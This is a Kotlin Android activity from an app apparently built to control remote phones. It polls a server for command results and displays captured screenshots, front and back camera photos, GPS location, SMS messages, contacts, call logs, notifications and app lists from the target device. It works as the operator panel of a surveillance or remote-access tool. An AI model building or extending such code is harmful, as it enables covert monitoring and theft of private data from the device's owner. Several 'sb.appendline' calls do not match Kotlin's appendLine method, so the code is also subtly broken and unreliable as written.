package com.abuzahra.admin.ui.device

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.View
import android.webkit.WebView
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.abuzahra.admin.R
import com.abuzahra.admin.data.api.ApiClient
import com.abuzahra.admin.data.api.ApiService
import com.abuzahra.admin.data.model.Command
import com.abuzahra.admin.databinding.ActivityCommandResultBinding
import com.abuzahra.admin.util.Preferences
import com.google.android.material.button.MaterialButton
import com.google.gson.Gson
import com.google.gson.JsonArray
import com.google.gson.JsonObject
import com.google.gson.JsonParser
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * CommandResultActivity — shows "جاري التنفيذ..." then polls for the command result.
 *
 * Flow:
 * 1. Opens with command_id + device_id + command_name
 * 2. Shows "جاري التنفيذ..." with spinner
 * 3. Polls GET /api/web/commands?device_id=X every 2 seconds
 * 4. Finds the command by ID, checks status
 * 5. When completed: parses result based on command type and displays it
 *    - Image commands (screenshot, camera) → ImageView
 *    - Location → WebView map (OpenStreetMap)
 *    - SMS/contacts/calls/etc → formatted text
 *    - Action commands → "تم التنفيذ بنجاح"
 * 6. Timeout after 60 seconds → error
 */
class CommandResultActivity : AppCompatActivity() {

    private lateinit var binding: ActivityCommandResultBinding
    private lateinit var api: ApiService
    private lateinit var deviceId: String
    private lateinit var commandId: String
    private lateinit var commandName: String
    private val handler = Handler(Looper.getMainLooper())
    private var pollCount = 0
    private val maxPolls = 30 // 60 seconds at 2s interval

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityCommandResultBinding.inflate(layoutInflater)
        setContentView(binding.root)

        deviceId = intent.getStringExtra(EXTRA_DEVICE_ID) ?: run { finish(); return }
        commandId = intent.getStringExtra(EXTRA_COMMAND_ID) ?: run { finish(); return }
        commandName = intent.getStringExtra(EXTRA_COMMAND_NAME) ?: "أمر"

        val prefs = Preferences.getInstance(this)
        api = ApiClient.createWithToken(prefs.serverUrl, prefs.token ?: "")

        setupToolbar()
        setupButtons()
        showLoading()
        startPolling()
    }

    private fun setupToolbar() {
        setSupportActionBar(binding.toolbar)
        supportActionBar?.title = commandName
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        binding.toolbar.setNavigationOnClickListener { finish() }
    }

    private fun setupButtons() {
        binding.btnClose.setOnClickListener { finish() }
        binding.btnCopy.setOnClickListener {
            val text = binding.tvResultText.text.toString()
            if (text.isNotEmpty()) {
                val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                clipboard.setPrimaryClip(ClipData.newPlainText("result", text))
                Toast.makeText(this, "تم النسخ", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun showLoading() {
        binding.loadingView.visibility = View.VISIBLE
        binding.resultView.visibility = View.GONE
        binding.errorView.visibility = View.GONE
        binding.tvCommandName.text = commandName
    }

    private fun startPolling() {
        lifecycleScope.launch {
            while (pollCount < maxPolls) {
                pollCount++
                try {
                    val commands = withContext(Dispatchers.IO) { api.getCommands(deviceId) }
                    val cmd = commands.find { it.id == commandId }

                    if (cmd != null) {
                        when (cmd.status.lowercase()) {
                            "completed", "success" -> {
                                showResult(cmd)
                                return@launch
                            }
                            "failed", "error" -> {
                                showError(cmd.result ?: "فشل تنفيذ الأمر")
                                return@launch
                            }
                        }
                    }
                } catch (e: Exception) {
                    // Network error, keep polling
                }

                // Update timeout text
                val remaining = (maxPolls - pollCount) * 2
                if (remaining <= 10) {
                    binding.tvTimeout.visibility = View.VISIBLE
                    binding.tvTimeout.text = "المتبقي: ${remaining} ثانية"
                }

                delay(2000)
            }

            // Timeout
            showError("انتهت المهلة - لم يتم استلام النتيجة من الجهاز")
        }
    }

    private fun showResult(cmd: Command) {
        binding.loadingView.visibility = View.GONE
        binding.resultView.visibility = View.VISIBLE
        binding.errorView.visibility = View.GONE

        val result = cmd.result ?: ""
        binding.tvStatus.text = "تم التنفيذ بنجاح"

        val timeStr = cmd.completedAt ?: cmd.createdAt
        binding.tvResultMeta.text = "الوقت: ${formatTime(timeStr)}"

        // Parse result based on command type
        val commandLower = commandName.lowercase()
        val cmdStr = cmd.command.lowercase()

        when {
            // Image results (base64 JPEG)
            isImageCommand(cmdStr) && result.length > 1000 && result.startsWith("/9j/") -> {
                showImageResult(result)
            }
            // Location result
            cmdStr.contains("location") || cmdStr.contains("get_location") -> {
                showLocationResult(result)
            }
            // SMS, contacts, calls, notifications — formatted text
            result.startsWith("[") || result.startsWith("{") -> {
                showFormattedResult(result, cmdStr)
            }
            // Plain text result
            result.isNotEmpty() -> {
                binding.tvResultText.visibility = View.VISIBLE
                binding.tvResultText.text = result
                binding.btnCopy.visibility = View.VISIBLE
            }
            // Empty result (action commands like flash, ring)
            else -> {
                binding.tvResultText.visibility = View.VISIBLE
                binding.tvResultText.text = "✅ تم تنفيذ الأمر بنجاح"
                binding.btnCopy.visibility = View.GONE
            }
        }
    }

    private fun isImageCommand(cmd: String): Boolean {
        return cmd.contains("screenshot") || cmd.contains("camera") ||
               cmd.contains("screen_capture") || cmd.contains("take_photo") ||
               cmd.contains("front_camera") || cmd.contains("back_camera")
    }

    private fun showImageResult(base64Data: String) {
        try {
            val bytes = Base64.decode(base64Data, Base64.DEFAULT)
            val bitmap = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
            binding.ivResultImage.visibility = View.VISIBLE
            binding.ivResultImage.setImageBitmap(bitmap)
            binding.tvResultText.visibility = View.GONE
            binding.btnCopy.visibility = View.GONE
        } catch (e: Exception) {
            binding.tvResultText.visibility = View.VISIBLE
            binding.tvResultText.text = "صورة (${"${base64Data.length} حرف"})"
        }
    }

    private fun showLocationResult(result: String) {
        try {
            val json = JsonParser.parseString(result).asJsonObject
            val lat = json.get("lat")?.asDouble ?: json.get("latitude")?.asDouble ?: 0.0
            val lng = json.get("lng")?.asDouble ?: json.get("longitude")?.asDouble ?: 0.0
            val accuracy = json.get("accuracy")?.asFloat

            if (lat != 0.0 && lng != 0.0) {
                // Show map
                binding.webMap.visibility = View.VISIBLE
                binding.webMap.settings.javaScriptEnabled = true
                val delta = 0.01
                val url = "https://www.openstreetmap.org/export/embed.html?bbox=${lng - delta}%2C${lat - delta}%2C${lng + delta}%2C${lat + delta}&layer=mapnik&marker=${lat}%2C${lng}"
                binding.webMap.loadUrl(url)

                // Also show coordinates as text
                val text = buildString {
                    appendLine("📍 الموقع:")
                    appendLine("  خط العرض: $lat")
                    appendLine("  خط الطول: $lng")
                    if (accuracy != null) appendLine("  الدقة: ±${accuracy.toInt()} متر")
                    json.get("altitude")?.let { appendLine("  الارتفاع: ${it.asDouble.toInt()} متر") }
                    json.get("speed")?.let { appendLine("  السرعة: ${it.asFloat} م/ث") }
                }
                binding.tvResultText.visibility = View.VISIBLE
                binding.tvResultText.text = text
                binding.btnCopy.visibility = View.VISIBLE
            } else {
                showFormattedResult(result, "location")
            }
        } catch (e: Exception) {
            showFormattedResult(result, "location")
        }
    }

    private fun showFormattedResult(result: String, cmdStr: String) {
        binding.tvResultText.visibility = View.VISIBLE
        binding.btnCopy.visibility = View.VISIBLE

        try {
            val parsed = JsonParser.parseString(result)
            val formatted = when {
                parsed.isJsonArray -> formatJsonArray(parsed.asJsonArray, cmdStr)
                parsed.isJsonObject -> formatJsonObject(parsed.asJsonObject, cmdStr)
                else -> result
            }
            binding.tvResultText.text = formatted
        } catch (e: Exception) {
            binding.tvResultText.text = result
        }
    }

    private fun formatJsonArray(arr: JsonArray, cmdStr: String): String {
        if (arr.size() == 0) return "لا توجد بيانات"

        val sb = StringBuilder()
        sb.appendline("📊 النتائج (${arr.size()} عنصر):")
        sb.appendline()

        for (i in 0 until minOf(arr.size(), 100)) {
            val item = arr[i]
            if (item.isJsonObject) {
                val obj = item.asJsonObject
                sb.appendline("${i + 1}. ${objToString(obj, cmdStr)}")
            } else {
                sb.appendline("${i + 1}. ${item.asString}")
            }
        }

        if (arr.size() > 100) {
            sb.appendline("... و${arr.size() - 100} عنصر آخر")
        }

        return sb.toString()
    }

    private fun objToString(obj: JsonObject, cmdStr: String): String {
        val sb = StringBuilder()
        when {
            cmdStr.contains("sms") || cmdStr.contains("message") -> {
                val address = obj.get("address")?.asString ?: obj.get("number")?.asString ?: ""
                val body = obj.get("body")?.asString ?: obj.get("message")?.asString ?: ""
                val date = obj.get("date")?.asString ?: ""
                sb.append("📍 $address")
                if (date.isNotEmpty()) sb.append(" | $date")
                sb.append("\n   💬 $body")
            }
            cmdStr.contains("contact") -> {
                val name = obj.get("name")?.asString ?: obj.get("display_name")?.asString ?: ""
                val phone = obj.get("phone")?.asString ?: obj.get("number")?.asString ?: ""
                val email = obj.get("email")?.asString ?: ""
                sb.append("👤 $name")
                if (phone.isNotEmpty()) sb.append("\n   📞 $phone")
                if (email.isNotEmpty()) sb.append("\n   ✉️ $email")
            }
            cmdStr.contains("call") -> {
                val number = obj.get("number")?.asString ?: obj.get("phone")?.asString ?: ""
                val type = obj.get("type")?.asString ?: ""
                val duration = obj.get("duration")?.asString ?: ""
                val date = obj.get("date")?.asString ?: ""
                sb.append("📞 $number")
                if (type.isNotEmpty()) sb.append(" | $type")
                if (duration.isNotEmpty()) sb.append(" | ${duration}ث")
                if (date.isNotEmpty()) sb.append(" | $date")
            }
            cmdStr.contains("notification") -> {
                val app = obj.get("app")?.asString ?: obj.get("package")?.asString ?: ""
                val title = obj.get("title")?.asString ?: ""
                val text = obj.get("text")?.asString ?: ""
                sb.append("🔔 $app: $title")
                if (text.isNotEmpty()) sb.append("\n   $text")
            }
            cmdStr.contains("app") -> {
                val name = obj.get("name")?.asString ?: obj.get("label")?.asString ?: ""
                val pkg = obj.get("package")?.asString ?: obj.get("package_name")?.asString ?: ""
                val version = obj.get("version")?.asString ?: obj.get("version_name")?.asString ?: ""
                sb.append("📱 $name")
                if (pkg.isNotEmpty()) sb.append("\n   📦 $pkg")
                if (version.isNotEmpty()) sb.append(" | v$version")
            }
            else -> {
                // Generic: show all key-value pairs
                for ((key, value) in obj.entrySet()) {
                    sb.append("  $key: $value\n")
                }
            }
        }
        return sb.toString().trim()
    }

    private fun formatJsonObject(obj: JsonObject, cmdStr: String): String {
        val sb = StringBuilder()
        sb.appendline("📋 النتائج:")
        sb.appendline()
        for ((key, value) in obj.entrySet()) {
            sb.append("$key: $value\n")
        }
        return sb.toString()
    }

    private fun showError(message: String) {
        binding.loadingView.visibility = View.GONE
        binding.resultView.visibility = View.GONE
        binding.errorView.visibility = View.VISIBLE
        binding.tvError.text = message
    }

    private fun formatTime(timeStr: String): String {
        return try {
            val sdf = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.getDefault())
            val date = sdf.parse(timeStr) ?: return timeStr
            SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(date)
        } catch (e: Exception) {
            timeStr
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacksAndMessages(null)
    }

    companion object {
        const val EXTRA_DEVICE_ID = "extra_device_id"
        const val EXTRA_COMMAND_ID = "extra_command_id"
        const val EXTRA_COMMAND_NAME = "extra_command_name"

        fun newIntent(
            context: Context,
            deviceId: String,
            commandId: String,
            commandName: String
        ): Intent {
            return Intent(context, CommandResultActivity::class.java).apply {
                putExtra(EXTRA_DEVICE_ID, deviceId)
                putExtra(EXTRA_COMMAND_ID, commandId)
                putExtra(EXTRA_COMMAND_NAME, commandName)
            }
        }
    }
}
